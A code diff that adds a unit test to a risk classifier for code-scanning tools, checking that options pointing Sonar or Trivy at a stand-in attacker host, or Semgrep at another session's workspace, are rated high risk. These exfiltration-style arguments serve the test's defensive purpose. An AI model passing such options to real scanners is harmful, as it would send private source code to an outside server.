@@ -53,6 +53,14 @@ def test_risk_ops_pattern_raises_the_level() -> None:
     assert risk_of("SEMGREP", ["--config=p/default"]) == LOW
 
 
+def test_a_code_tool_option_that_sends_code_away_is_high() -> None:
+    assert risk_of("SONAR_SCAN", ["-Dsonar.host.url=https://attacker.example"]) == HIGH
+    assert risk_of("TRIVY", ["--server", "attacker:4954"]) == HIGH
+    assert risk_of("SEMGREP", ["/workspace/code/another-session"]) == HIGH
+    assert risk_of("SONAR_SCAN", []) == LOW
+    assert risk_of("TRIVY", ["--severity", "HIGH,CRITICAL"]) == LOW
+
+
 def test_destructive_tool_is_at_least_high() -> None:
     # tool_specs marks these destructive; risk_ops does not escalate them, so the
     # destructive flag is what pins them to HIGH.
